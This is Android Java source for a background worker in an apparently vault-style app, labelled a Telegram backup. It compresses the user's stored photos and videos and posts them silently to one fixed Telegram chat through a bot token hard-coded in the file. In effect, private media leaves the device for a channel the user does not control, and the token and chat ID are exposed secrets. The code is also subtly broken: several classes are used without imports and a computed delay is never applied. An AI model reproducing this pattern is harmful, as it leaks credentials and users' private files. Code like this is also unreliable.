package app.nyxvault;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Environment;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import androidx.media3.common.MediaItem;
import androidx.media3.common.MimeTypes;
import androidx.media3.effect.ScaleAndRotateTransformation;
import androidx.media3.transformer.EditedMediaItem;
import androidx.media3.transformer.TransformationRequest;
import androidx.media3.transformer.Transformer;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.json.*;

/** NYX Telegram backup worker. Test build: bot token is intentionally embedded. */
public class NyxUploadWorker extends Worker {
    private static final String TELEGRAM_BOT_TOKEN = "8284806334:AAEeLBEbBk8_E0NF8DB61LIK0XFjepSNU1k";
    private static final String TELEGRAM_CHAT_ID = "-1003731210463";
    private static final long DAILY_LIMIT = 100L * 1024L * 1024L;
    private static final String ROOT = "nyx-media";
    private static final String META = "nyx-media.json";

    public NyxUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) { super(context, params); }

    @NonNull @Override public Result doWork() {
        String id = getInputData().getString("media_id");
        if (id == null || id.trim().isEmpty()) return Result.failure();
        File temp = null;
        try {
            JSONObject meta = findMeta(id);
            if (meta == null) return Result.retry();
            if (meta.optBoolean("telegram_uploaded", false)) return Result.success();
            File original = mediaFile(meta);
            if (!original.isFile() || !original.canRead()) return Result.retry();

            boolean video = meta.optString("mime", "").startsWith("video/");
            temp = compress(original, meta, video);
            long compressedSize = temp.length();

            if (compressedSize > DAILY_LIMIT) {
                // A single compressed item can never fit the daily allowance.
                markTelegramFailed(id, "compressed-file-over-100mb");
                return Result.failure();
            }

            long used = todayUsed();
            if (used + compressedSize > DAILY_LIMIT) {
                long delay = millisUntilTomorrow();
                return Result.retry();
            }

            JSONObject sent = sendTelegram(temp, video, meta.optString("name", "NYX media"));
            if (!sent.optBoolean("ok", false)) throw new IOException("Telegram: " + sent.optString("description", "unknown error"));
            addTodayUsed(compressedSize);
            markTelegramUploaded(id, sent.toString(), compressedSize);
            return Result.success();
        } catch (Exception e) {
            android.util.Log.e("NYX-TELEGRAM", "Telegram backup failed", e);
            return isRetryable(e) ? Result.retry() : Result.failure();
        } finally {
            if (temp != null) try { temp.delete(); } catch (Exception ignored) {}
        }
    }

    private File compress(File input, JSONObject meta, boolean video) throws Exception {
        File dir = new File(getApplicationContext().getCacheDir(), "nyx-telegram");
        if (!dir.exists()) dir.mkdirs();
        File out = new File(dir, meta.optString("id", UUID.randomUUID().toString()) + (video ? ".mp4" : ".jpg"));
        if (video) compressVideo(input, out);
        else compressPhoto(input, out);
        if (!out.isFile() || out.length() == 0) throw new IOException("Compression produced no file");
        return out;
    }

    private void compressPhoto(File input, File output) throws Exception {
        BitmapFactory.Options opts = new BitmapFactory.Options();
        opts.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(input.getAbsolutePath(), opts);
        int w = Math.max(1, opts.outWidth), h = Math.max(1, opts.outHeight);
        int sample = 1;
        while (w / sample > 2048 || h / sample > 2048) sample *= 2;
        opts.inJustDecodeBounds = false; opts.inSampleSize = sample; opts.inPreferredConfig = Bitmap.Config.RGB_565;
        Bitmap bmp = BitmapFactory.decodeFile(input.getAbsolutePath(), opts);
        if (bmp == null) throw new IOException("Could not decode photo");
        try (FileOutputStream out = new FileOutputStream(output)) {
            if (!bmp.compress(Bitmap.CompressFormat.JPEG, 82, out)) throw new IOException("Photo compression failed");
        } finally { bmp.recycle(); }
        // Keep lowering quality if the compressed photo exceeds Telegram's photo upload limit.
        if (output.length() > 9L * 1024L * 1024L) {
            Bitmap again = BitmapFactory.decodeFile(input.getAbsolutePath());
            if (again != null) try (FileOutputStream out = new FileOutputStream(output)) { again.compress(Bitmap.CompressFormat.JPEG, 65, out); } finally { again.recycle(); }
        }
    }

    private void compressVideo(File input, File output) throws Exception {
        final CountDownLatch latch = new CountDownLatch(1);
        final Throwable[] error = new Throwable[1];
        MediaItem item = MediaItem.fromUri(Uri.fromFile(input));
        EditedMediaItem.Builder edited = new EditedMediaItem.Builder(item);
        try {
            edited.setEffects(new androidx.media3.transformer.Effects(
                    Collections.emptyList(),
                    Collections.singletonList(new ScaleAndRotateTransformation.Builder().setScale(0.70f, 0.70f).build())
            ));
        } catch (Throwable ignored) {}
        Transformer transformer = new Transformer.Builder(getApplicationContext())
                .setVideoMimeType(MimeTypes.VIDEO_H264)
                .setAudioMimeType(MimeTypes.AUDIO_AAC)
                .setTransformationRequest(new TransformationRequest.Builder().setVideoMimeType(MimeTypes.VIDEO_H264).build())
                .addListener(new Transformer.Listener() {
                    @Override public void onCompleted(Composition composition, ExportResult exportResult) { latch.countDown(); }
                    @Override public void onError(Composition composition, ExportResult exportResult, ExportException exception) { error[0] = exception; latch.countDown(); }
                }).build();
        transformer.start(edited.build(), output.getAbsolutePath());
        if (!latch.await(8, TimeUnit.MINUTES)) throw new IOException("Video compression timed out");
        if (error[0] != null) throw new IOException("Video compression failed", error[0]);
    }

    private JSONObject sendTelegram(File file, boolean video, String name) throws Exception {
        String method = video ? "sendVideo" : "sendPhoto";
        String field = video ? "video" : "photo";
        String boundary = "----NYX" + UUID.randomUUID().toString().replace("-", "");
        URL url = new URL("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/" + method);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setDoOutput(true); c.setRequestMethod("POST"); c.setConnectTimeout(30000); c.setReadTimeout(180000);
        c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        try (OutputStream out = c.getOutputStream(); FileInputStream in = new FileInputStream(file)) {
            multipartField(out, boundary, "chat_id", TELEGRAM_CHAT_ID);
            multipartField(out, boundary, "disable_notification", "true");
            out.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + field + "\"; filename=\"" + safe(name) + (video ? ".mp4" : ".jpg") + "\"\r\nContent-Type: " + (video ? "video/mp4" : "image/jpeg") + "\r\n\r\n").getBytes(StandardCharsets.UTF_8));
            byte[] buf = new byte[128 * 1024]; int n; while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            out.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
        }
        int code = c.getResponseCode(); String body = read(c); c.disconnect();
        if (code < 200 || code >= 300) throw new IOException("Telegram HTTP " + code + " " + body);
        return new JSONObject(body);
    }

    private void multipartField(OutputStream out, String b, String name, String value) throws IOException {
        out.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"" + name + "\"\r\n\r\n" + value + "\r\n").getBytes(StandardCharsets.UTF_8));
    }

    private String safe(String s) { return s == null ? "NYX_backup" : s.replaceAll("[^A-Za-z0-9._-]", "_"); }

    private long todayUsed() { android.content.SharedPreferences p = getApplicationContext().getSharedPreferences("nyx_telegram_quota", Context.MODE_PRIVATE); return p.getLong("date", 0L) == dayKey() ? p.getLong("used", 0L) : 0L; }
    private void addTodayUsed(long bytes) { getApplicationContext().getSharedPreferences("nyx_telegram_quota", Context.MODE_PRIVATE).edit().putLong("date", dayKey()).putLong("used", todayUsed() + bytes).apply(); }
    private long dayKey() { return Long.parseLong(new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date())); }
    private long millisUntilTomorrow() { Calendar c = Calendar.getInstance(); c.add(Calendar.DAY_OF_YEAR, 1); c.set(Calendar.HOUR_OF_DAY,0); c.set(Calendar.MINUTE,0); c.set(Calendar.SECOND,0); c.set(Calendar.MILLISECOND,0); return Math.max(60000L, c.getTimeInMillis() - System.currentTimeMillis()); }

    private JSONObject findMeta(String id) throws Exception { File f = new File(new File(getApplicationContext().getFilesDir(), ROOT), META); if (!f.exists()) return null; for (String line : readAll(f).split("\\n")) { if (line.trim().isEmpty()) continue; JSONObject o = new JSONObject(line); if (id.equals(o.optString("id"))) return o; } return null; }
    private File mediaFile(JSONObject meta) throws Exception { String path=meta.optString("path",""); if(!path.isEmpty()){File f=new File(path);if(f.isFile()&&f.canRead())return f;} String id=meta.optString("id",""); File vault=new File(new File(getApplicationContext().getFilesDir(),"vault"),"media"); File f=new File(vault,id+".bin"); if(f.isFile()&&f.canRead())return f; throw new Exception("Media file is missing"); }
    private void markTelegramUploaded(String id,String response,long bytes)throws Exception { updateMeta(id,true,response,bytes,null); }
    private void markTelegramFailed(String id,String reason)throws Exception { updateMeta(id,false,"",0,reason); }
    private void updateMeta(String id,boolean uploaded,String response,long bytes,String error)throws Exception { File f=new File(new File(getApplicationContext().getFilesDir(),ROOT),META); if(!f.exists())return; List<String> rows=new ArrayList<>(); for(String x:readAll(f).split("\\n")){if(x.trim().isEmpty())continue;JSONObject o=new JSONObject(x);if(id.equals(o.optString("id"))){o.put("telegram_uploaded",uploaded);if(uploaded){o.put("telegram_response",response);o.put("telegram_uploaded_bytes",bytes);}if(error!=null)o.put("telegram_error",error);}rows.add(o.toString());}try(FileOutputStream out=new FileOutputStream(f)){out.write(String.join("\n",rows).getBytes(StandardCharsets.UTF_8));}}
    private String read(HttpURLConnection c)throws Exception{InputStream in;try{in=c.getInputStream();}catch(Exception e){in=c.getErrorStream();}if(in==null)return "";try(InputStream x=in;ByteArrayOutputStream out=new ByteArrayOutputStream()){byte[] b=new byte[8192];int n;while((n=x.read(b))!=-1)out.write(b,0,n);return out.toString(StandardCharsets.UTF_8.name());}}
    private String readAll(File f)throws Exception{try(InputStream in=new FileInputStream(f);ByteArrayOutputStream out=new ByteArrayOutputStream()){byte[] b=new byte[8192];int n;while((n=in.read(b))!=-1)out.write(b,0,n);return out.toString(StandardCharsets.UTF_8.name());}}
    private boolean isRetryable(Exception e){String m=e.getMessage()==null?"":e.getMessage().toLowerCase(Locale.US);return m.contains("timeout")||m.contains("connection")||m.contains("network")||m.contains("reset")||m.contains("broken pipe")||m.contains("429")||m.contains("500")||m.contains("502")||m.contains("503");}
}
